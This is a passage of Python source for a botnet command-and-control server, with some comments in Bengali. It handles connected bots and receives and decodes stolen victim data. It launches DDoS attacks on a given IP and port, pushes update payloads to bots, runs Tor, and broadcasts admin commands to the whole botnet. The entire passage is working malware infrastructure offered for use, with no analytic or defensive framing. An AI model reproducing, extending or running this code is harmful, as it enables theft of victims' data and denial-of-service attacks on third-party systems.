    def _get_uptime(self) -> str:
        if hasattr(self, '_start_time'):
            uptime_seconds = int(time.time() - self._start_time)
            hours = uptime_seconds // 3600
            minutes = (uptime_seconds % 3600) // 60
            seconds = uptime_seconds % 60
            return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        return "N/A"

    def _show_status(self):
        lines = []
        lines.append("╔══════════════════════════════════════════════════════════════╗")
        lines.append("║                    📊 FEATURE STATUS                       ║")
        lines.append("╠══════════════════════════════════════════════════════════════╣")
        lines.append(f"║ 🔍 Data Steal  : {'✅ ENABLED' if self.steal_enabled else '❌ DISABLED':<44} ║")
        lines.append(f"║ 💣 DDoS        : {'✅ ENABLED' if self.ddos_enabled else '❌ DISABLED':<44} ║")
        lines.append(f"║ 🔒 Tor         : {'✅ ENABLED' if self.tor_enabled else '❌ DISABLED':<44} ║")
        lines.append(f"║ 📄 Update File : {'✅ Available' if os.path.exists(self.update_file) else '❌ Not Found':<44} ║")
        lines.append(f"║ 🤖 Total Bots  : {len(self.clients):<44} ║")
        lines.append("╚══════════════════════════════════════════════════════════════╝")
        print("\n".join(lines))

    # ======================================================================== #
    # Command Processing - UPDATED with OS INFO
    # ======================================================================== #
    
    def _process_bot_command(self, cmd: str, addr: Tuple[str, int]) -> Optional[str]:
        cmd = cmd.strip()
        if not cmd:
            return None

        # ✅ Bot থেকে OS তথ্য গ্রহণ করুন
        if cmd.startswith("OS_INFO:"):
            try:
                os_info = cmd.split(":", 1)[1]
                os_parts = os_info.split("|")
                os_name = os_parts[0] if len(os_parts) > 0 else "Unknown"
                os_version = os_parts[1] if len(os_parts) > 1 else "Unknown"
                
                with self.clients_lock:
                    if addr in self.clients:
                        self.clients[addr]['os_name'] = os_name
                        self.clients[addr]['os_version'] = os_version
                        print_info(f"🤖 Bot {addr} OS: {os_name} {os_version}")
                        log.info(f"Bot {addr} OS: {os_name} {os_version}")
                return None
            except Exception as e:
                print_warning(f"Failed to parse OS info: {e}")
                return None

        # ✅ Tor স্ট্যাটাস আপডেট করুন
        if cmd.startswith("TOR_STATUS:"):
            try:
                status = cmd.split(":", 1)[1]
                with self.clients_lock:
                    if addr in self.clients:
                        self.clients[addr]['tor_status'] = status
                        print_info(f"🤖 Bot {addr} Tor Status: {status}")
                        log.info(f"Bot {addr} Tor Status: {status}")
                return None
            except Exception as e:
                return None

        # ✅ GET_TOR_CONFIG - Tor কনফিগারেশন পাঠান
        if cmd == "GET_TOR_CONFIG":
            config = {
                "hidden_services": [
                    {
                        "service_name": "default_hs",
                        "ports": [[80, "127.0.0.1", 80]]
                    }
                ],
                "relays": []
            }
            print_info(f"📤 Sending Tor config to {addr}")
            log.info(f"Tor config sent to {addr}")
            return json.dumps(config)

        # ✅ DOWNLOAD confirmation messages from bot
        if cmd.startswith("DOWNLOAD_SUCCESS:"):
            filename = cmd.split(":", 1)[1] if ":" in cmd else "unknown"
            print_success(f"🤖 Bot {addr} - ✅ File downloaded successfully: {filename}")
            log.info(f"Bot {addr} - File downloaded: {filename}")
            return None

        if cmd.startswith("DOWNLOAD_FAILED:"):
            filename = cmd.split(":", 1)[1] if ":" in cmd else "unknown"
            print_error(f"🤖 Bot {addr} - ❌ File download failed: {filename}")
            log.error(f"Bot {addr} - File download failed: {filename}")
            return None

        # ✅ UPDATE confirmation messages from bot
        if cmd == "UPDATE_INSTALLED_SUCCESSFULLY":
            print_success(f"🤖 Bot {addr} - ✅ Update installed successfully!")
            print_info(f"📌 Bot {addr} - Now running latest version")
            log.info(f"Bot {addr} - Update installed successfully!")
            return None

        if cmd == "UPDATE_INSTALLATION_STARTED":
            print_info(f"🤖 Bot {addr} - 🔄 Update installation started...")
            return None

        if cmd == "UPDATE_DOWNLOAD_FAILED":
            print_error(f"🤖 Bot {addr} - ❌ Update download failed!")
            return None

        if cmd == "UPDATE_FILE_CORRUPTED":
            print_error(f"🤖 Bot {addr} - ❌ Update file corrupted!")
            return None

        if cmd.startswith("UPDATE_VERIFICATION_FAILED:"):
            error_msg = cmd.split(":", 1)[1] if ":" in cmd else "Unknown"
            print_error(f"🤖 Bot {addr} - ❌ Verification failed: {error_msg}")
            return None

        if cmd.startswith("UPDATE_START_FAILED:"):
            error_msg = cmd.split(":", 1)[1] if ":" in cmd else "Unknown"
            print_error(f"🤖 Bot {addr} - ❌ Start failed: {error_msg}")
            return None

        if cmd.startswith("UPDATE_INSTALLATION_ERROR:"):
            error_msg = cmd.split(":", 1)[1] if ":" in cmd else "Unknown"
            print_error(f"🤖 Bot {addr} - ❌ Installation error: {error_msg}")
            return None

        if cmd == "UPDATE_INSTALLATION_FAILED":
            print_error(f"🤖 Bot {addr} - ❌ Update installation failed!")
            return None

        # ✅ EXEC OUTPUT - Bot থেকে EXEC আউটপুট প্রিন্ট করুন
        if (cmd.startswith("ERROR:") or cmd.startswith("File not found") or 
            cmd.startswith("Command executed") or len(cmd) > 50 and not cmd.startswith("PING") and not cmd.startswith("PONG")):
            
            if not cmd.startswith("PING") and not cmd.startswith("PONG"):
                if len(cmd) < 5000:
                    print(f"\n{Colors.LIGHT_GREEN}📤 Output from {addr}:{Colors.END}")
                    print(f"{Colors.WHITE}{cmd}{Colors.END}")
                    print("")
                else:
                    print_info(f"📤 Large output from {addr} ({len(cmd)} bytes) - saved in log")
                    log.info(f"Large output from {addr}: {cmd[:500]}...")

        if len(cmd) > 5000:
            print_data(f"Receiving large response from {addr} (size: {len(cmd)} bytes)")
            log.info(f"Received large response from {addr} (size: {len(cmd)} bytes)")

        # Bot responses - Existing
        if cmd == "Steal disabled by C2":
            print_info(f"🤖 Bot {addr} reported: Data Steal is disabled")
            return None

        if cmd == "Data theft started.":
            print_info(f"🤖 Bot {addr} reported: Data theft started")
            return None

        if cmd == "Data theft already running.":
            print_info(f"🤖 Bot {addr} reported: Data theft already running")
            return None

        if cmd == "Data theft stopped.":
            print_info(f"🤖 Bot {addr} reported: Data theft stopped")
            return None

        if cmd.startswith("STEAL_DATA "):
            print_data(f"Receiving steal data from {addr} (size: {len(cmd)} bytes)")
            log.info(f"Received steal data from {addr} (size: {len(cmd)} bytes)")
            try:
                encoded_data = cmd[11:]
                if encoded_data.startswith("COMPRESSED:"):
                    compressed_b64 = encoded_data[11:]
                    compressed = base64.b64decode(compressed_b64)
                    decompressed = zlib.decompress(compressed)
                    data = json.loads(decompressed.decode('utf-8'))
                else:
                    decoded = base64.b64decode(encoded_data)
                    data = json.loads(decoded.decode('utf-8'))
                
                json_path, extracted_path = self._save_and_extract_steal_data(data, addr)
                
                print_success(f"Steal data saved to: {json_path}")
                if extracted_path:
                    print_success(f"Extracted to: {extracted_path}")
                
                log.info(f"Saved steal data to: {json_path}")
                return f"STEAL_DATA_RECEIVED (#{self.steal_counter})"
                
            except Exception as e:
                print_error(f"Failed to process steal data: {e}")
                log.error(f"Failed to process steal data: {e}")
                return f"STEAL_DATA_ERROR: {e}"

        # LIST command - Bot থেকে আসা LIST রেসপন্স প্রসেস
        if cmd.startswith("LIST command received"):
            return f"📊 Bot Response:\n{cmd}"

        if cmd.startswith("Connected bots:") or "Bot #" in cmd:
            return f"📊 Bot Response:\n{cmd}"

        VALID_COMMANDS = {
            "PING", "PONG", "LIST", "UPDATE", "DDOS", 
            "STEAL", "STOP_STEAL", "TOR_START", "TOR_STOP", 
            "TOR_INFO", "DOWNLOAD", "EXIT", "SHOW_STEAL", "LATEST_STEAL"
        }
        
        parts = cmd.split()
        if not parts:
            return None
        cmd_upper = parts[0].upper()
        if cmd_upper not in VALID_COMMANDS:
            return None

        print_bot_event(f"← {addr} → {cmd[:100]}...")
        log.info(f"← {addr} → {cmd[:100]}...")

        try:
            if cmd_upper == "PING":
                return "PONG"
            elif cmd_upper == "PONG":
                return None
            elif cmd_upper == "LIST":
                return self._get_dynamic_bot_list()
            
            # ✅ UPDATED: UPDATE command with modules/auto_update.py
            elif cmd_upper == "UPDATE":
                if os.path.exists(self.update_file):
                    print_success(f"📤 Sending UPDATE_AVAILABLE to {addr} - File: {self.update_file}")
                    log.info(f"UPDATE_AVAILABLE sent to {addr} - File available")
                    return "UPDATE_AVAILABLE"
                else:
                    print_warning(f"📤 Sending No update available to {addr} - No update file found")
                    log.warning(f"No update available sent to {addr} - No update file")
                    return "No update available"
            
            elif cmd_upper == "DDOS":
                if not self.ddos_enabled:
                    return "❌ DDoS is currently DISABLED (Use 'ddos_on' to enable)"
                
                if len(parts) < 4:
                    return "ERROR: DDOS requires IP, PORT, DURATION"
                try:
                    ip = parts[1]
                    port = int(parts[2])
                    duration = int(parts[3])
                    attack_type = parts[4] if len(parts) > 4 else "SYN"
                    threading.Thread(target=start_ddos, args=(ip, port, duration, attack_type), daemon=True).start()
                    print_warning(f"DDOS {attack_type} started on {ip}:{port} for {duration}s")
                    return f"DDOS {attack_type} started on {ip}:{port} for {duration}s"
                except Exception as e:
                    return f"DDOS Error: {e}"
            elif cmd_upper == "STEAL":
                if not self.steal_enabled:
                    return "❌ Data Steal is currently DISABLED (Use 'steal_on' to enable)"
                
                try:
                    send_data_to_c2(f"DATA_STEAL from {addr}")
                    print_success("Data stealing started")
                    return "STEAL_STARTED"
                except Exception as e:
                    print_error(f"Steal failed: {e}")
                    return f"STEAL_ERROR: {e}"
            elif cmd_upper == "STOP_STEAL":
                try:
                    print_info("Data stealing stopped")
                    return "Data stealing stopped."
                except Exception as e:
                    return f"Stop steal failed: {e}"
            elif cmd_upper == "TOR_START":
                if not self.tor_enabled:
                    return "❌ Tor is currently DISABLED (Use 'tor_on' to enable)"
                
                if not self.tor_running:
                    try:
                        self.tor_manager.start()
                        self.tor_running = True
                        print_success("Tor relay started")
                        return "Tor relay started."
                    except Exception as e:
                        return f"Tor start failed: {e}"
                print_warning("Tor already running")
                return "Tor already running."
            elif cmd_upper == "TOR_STOP":
                if self.tor_running:
                    try:
                        self.tor_manager.stop()
                        self.tor_running = False
                        print_success("Tor relay stopped")
                        return "Tor relay stopped."
                    except Exception as e:
                        return f"Tor stop failed: {e}"
                print_warning("Tor not running")
                return "Tor not running."
            elif cmd_upper == "TOR_INFO":
                try:
                    info = get_tor_relay_info()
                    with self.clients_lock:
                        if addr in self.clients:
                            tor_status = self.clients[addr].get('tor_status', 'Not Started')
                            info['bot_tor_status'] = tor_status
                    return json.dumps(info, indent=2)
                except Exception as e:
                    return f"Tor info failed: {e}"
            elif cmd_upper == "DOWNLOAD":
                filename = parts[1] if len(parts) > 1 else "modules/auto_update.py"
                try:
                    if os.path.exists(filename):
                        with open(filename, "rb") as f:
                            content = f.read()
                        file_size = len(content)
                        print_success(f"📤 File {filename} sent to {addr} ({file_size} bytes)")
                        log.info(f"File {filename} sent to {addr} ({file_size} bytes)")
                        
                        try:
                            text_content = content.decode('utf-8')
                            return f"FILE_CONTENT:{filename}:{text_content}"
                        except UnicodeDecodeError:
                            encoded = base64.b64encode(content).decode('utf-8')
                            return f"BINARY:{filename}:{encoded}"
                    else:
                        print_warning(f"File not found: {filename}")
                        log.warning(f"File not found: {filename}")
                        return f"File not found: {filename}"
                except Exception as e:
                    print_error(f"Error reading file: {e}")
                    return f"Error reading file: {e}"
            elif cmd_upper == "SHOW_STEAL":
                return self._list_steal_files()
            elif cmd_upper == "LATEST_STEAL":
                latest = self._get_latest_steal_file()
                if latest:
                    return f"Latest steal file: {latest}"
                return "No steal files found."
            elif cmd_upper == "EXIT":
                print_warning("Exit command received from bot")
                return "Bye."
            else:
                return None
        except Exception as exc:
            log.exception(f"Command processing error for {addr}:")
            return f"ERROR: {exc}"

    # ======================================================================== #
    # Admin Console - UPDATED with DIR/LS command
    # ======================================================================== #
    
    def _admin_console(self):
        print_header("🔧 ADMIN CONSOLE")
        print_info("Type 'help' for commands")
        print_info("Type 'quit' or 'exit' to shutdown")
        print("")
        
        while not self.shutdown_flag:
            try:
                cmd = input(f"\n{Colors.LIGHT_YELLOW}💻 C2> {Colors.END}").strip()
            except EOFError:
                break
            if not cmd:
                continue
            
            # ✅ C2 তে dir/ls কমান্ড - ফাইল লিস্ট দেখান
            if cmd.lower() in ("dir", "ls"):
                print_header("📁 C2 DIRECTORY LISTING")
                try:
                    files = os.listdir(".")
                    print(f"{'Filename':<45} {'Size':<12} {'Modified':<20}")
                    print("-" * 75)
                    
                    total_size = 0
                    file_count = 0
                    dir_count = 0
                    
                    for file in sorted(files):
                        full_path = os.path.join(".", file)
                        if os.path.isfile(full_path):
                            size = os.path.getsize(full_path)
                            total_size += size
                            file_count += 1
                            mtime = datetime.fromtimestamp(os.path.getmtime(full_path)).strftime("%Y-%m-%d %H:%M:%S")
                            
                            if size > 1024 * 1024:
                                size_str = f"{size / (1024*1024):.2f} MB"
                            elif size > 1024:
                                size_str = f"{size / 1024:.2f} KB"
                            else:
                                size_str = f"{size} B"
                                
                            print(f"{file:<45} {size_str:>10}  {mtime}")
                        elif os.path.isdir(full_path):
                            dir_count += 1
                            mtime = datetime.fromtimestamp(os.path.getmtime(full_path)).strftime("%Y-%m-%d %H:%M:%S")
                            print(f"{file:<45} {'<DIR>':>10}  {mtime}")
                    
                    print("-" * 75)
                    print(f"Total: {file_count} files, {dir_count} folders, {total_size:,} bytes")
                    print("")
                except Exception as e:
                    print_error(f"Error listing directory: {e}")
                continue
            
            # bot <number> কমান্ড
            if cmd.lower().startswith("bot "):
                try:
                    bot_number = int(cmd.split()[1])
                    result = self._get_bot_details(bot_number)
                    print(result)
                except ValueError:
                    print_warning("Usage: bot <number> (e.g., bot 1)")
                except Exception as e:
                    print_error(f"Error: {e}")
                continue
            
            # refresh কমান্ড
            if cmd.lower() == "refresh":
                print_info("🔄 Refreshing bot list...")
                result = self._get_dynamic_bot_list()
                print(result)
                continue
            
            # stats কমান্ড
            if cmd.lower() == "stats":
                result = self._get_server_stats()
                print(result)
                continue
            
            # status কমান্ড
            if cmd.lower() == "status":
                self._show_status()
                continue
            
            # ✅ upload_update কমান্ড - Update ফাইল আপলোড করতে
            if cmd.lower().startswith("upload_update "):
                filename = cmd.split()[1] if len(cmd.split()) > 1 else None
                if filename and os.path.exists(filename):
                    try:
                        shutil.copy2(filename, self.update_file)
                        print_success(f"Update file uploaded: {filename} -> {self.update_file}")
                    except Exception as e:
                        print_error(f"Failed to upload: {e}")
                else:
                    print_warning(f"File not found: {filename}")
                continue
            
            # ✅ create_update কমান্ড - নতুন Update ফাইল তৈরি করতে
            if cmd.lower() == "create_update":
                try:
                    if os.path.exists("bot_client.py"):
                        os.makedirs("modules", exist_ok=True)
                        shutil.copy2("bot_client.py", self.update_file)
                        print_success(f"Update file created from bot_client.py -> {self.update_file}")
                    else:
                        print_warning("bot_client.py not found")
                except Exception as e:
                    print_error(f"Failed to create update: {e}")
                continue
            
            # steal_on/off কমান্ড
            if cmd.lower() == "steal_on":
                self.steal_enabled = True
                print_success("✅ Data Steal ENABLED")
                self.broadcast_command("STEAL_ENABLED")
                continue
            
            if cmd.lower() == "steal_off":
                self.steal_enabled = False
                print_warning("⚠️ Data Steal DISABLED")
                self.broadcast_command("STEAL_DISABLED")
                continue
            
            # ddos_on/off কমান্ড
            if cmd.lower() == "ddos_on":
                self.ddos_enabled = True
                print_success("✅ DDoS ENABLED")
                self.broadcast_command("DDOS_ENABLED")
                continue
            
            if cmd.lower() == "ddos_off":
                self.ddos_enabled = False
                print_warning("⚠️ DDoS DISABLED")
                self.broadcast_command("DDOS_DISABLED")
                continue
            
            # tor_on/off কমান্ড
            if cmd.lower() == "tor_on":
                self.tor_enabled = True
                print_success("✅ Tor ENABLED")
                self.broadcast_command("TOR_ENABLED")
                continue
            
            if cmd.lower() == "tor_off":
                self.tor_enabled = False
                print_warning("⚠️ Tor DISABLED")
                self.broadcast_command("TOR_DISABLED")
                continue
            
            if cmd.lower() == "debug on":
                print_info("Debug logging enabled")
                continue
            elif cmd.lower() == "debug off":
                print_info("Debug logging disabled")
                continue
            elif cmd.lower() == "help":
                self._print_help()
                continue
            if cmd.lower() in ("quit", "exit"):
                print_warning("Shutting down C2 Server...")
                self.shutdown_flag = True
                break
            
            self.broadcast_command(cmd)

    def broadcast_command(self, command: str):
        with self.clients_lock:
            if not self.clients:
                print_warning("No bots connected.")
                return
            print_info(f"📤 Broadcasting to {len(self.clients)} bots: {command}")
            success_count = 0
            for addr, client_data in list(self.clients.items()):
                try:
                    conn = client_data['socket']
                    key = client_data['key']
                    if self._send_data(conn, command, key):
                        success_count += 1
                        print_success(f"✅ Sent to {addr}")
                    else:
                        print_warning(f"❌ Failed to send to {addr}")
                except Exception as e:
                    print_warning(f"❌ Send failed to {addr}: {e}")
            print_info(f"📊 Sent to {success_count}/{len(self.clients)} bots")

    def _print_help(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    C2 Server Commands                       ║
╠══════════════════════════════════════════════════════════════╣
║ help              – Show this help message                  ║
║ dir/ls            – Show files in C2 directory             ║
║ list              – Show connected bots with OS & Key info  ║
║ bot <number>      – Show FULL bot details with Key         ║
║ refresh           – Refresh bot list                        ║
║ stats             – Show server statistics                  ║
║ status            – Show feature status                     ║
║ steal_on/off      – Enable/Disable Data Steal              ║
║ ddos_on/off       – Enable/Disable DDoS                    ║
║ tor_on/off        – Enable/Disable Tor                     ║
║ show_steal        – Show all saved steal data files         ║
║ latest_steal      – Show latest steal file name             ║
║ create_update     – Create update file from bot_client.py  ║
║ upload_update     – Upload update file (e.g., upload_update bot_v2.py) ║
║ broadcast <msg>   – Send message to all bots                ║
║ DDOS <ip> <port> <duration> <type> – Launch DDoS attack    ║
║ TOR_START         – Start Tor hidden service                ║
║ TOR_STOP          – Stop Tor hidden service                 ║
║ TOR_INFO          – Get Tor relay information               ║
║ STEAL             – Start data exfiltration                 ║
║ STOP_STEAL        – Stop data exfiltration                  ║
║ UPDATE            – Update bot client using modules/auto_update.py ║
║ DOWNLOAD <file>   – Download a file from C2                 ║
║ debug on/off      – Toggle debug logging                    ║
║ quit/exit         – Shutdown C2 server                     ║
╚══════════════════════════════════════════════════════════════╝
""")

    def shutdown(self):
        print_warning("Shutting down C2 Server...")
        self.shutdown_flag = True
        if self.tor_running:
            try:
                self.tor_manager.stop()
                print_success("Tor stopped")
            except:
                pass
        with self.clients_lock:
            for addr, client_data in list(self.clients.items()):
                try:
                    conn = client_data['socket']
                    conn.shutdown(socket.SHUT_RDWR)
                    conn.close()
                except:
                    pass
            self.clients.clear()
        if self.server_socket:
            try:
                self.server_socket.close()
                print_success("Server socket closed")
            except:
                pass
        print_success("C2 Server stopped. Bye.")
        log.info("C2 Server stopped. Bye.")

if __name__ == "__main__":
    server = C2Server()
    server.start()
